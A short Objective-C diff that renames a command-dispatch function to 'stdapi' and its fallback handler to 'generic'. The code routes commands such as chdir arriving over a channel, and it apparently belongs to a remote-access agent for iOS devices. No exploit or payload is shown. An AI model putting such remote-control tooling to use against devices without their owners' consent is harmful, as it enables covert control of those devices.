@@ -27,7 +27,7 @@
 #import "generic.h"
 #import "apple_ios/commands.h"
 
-void handle_command(int channel, char *cmd, char *args)
+void stdapi(int channel, char *cmd, char *args)
 {
     Commands *commands = [[Commands alloc] init];
     commands->channelPipe = channel;
@@ -66,5 +66,5 @@ void handle_command(int channel, char *cmd, char *args)
     else if ([command isEqualToString:@"chdir"])
         [commands cmd_chdir:argv];
     else
-        generic_handler(channel, cmd, args);
+        generic(channel, cmd, args);
 }
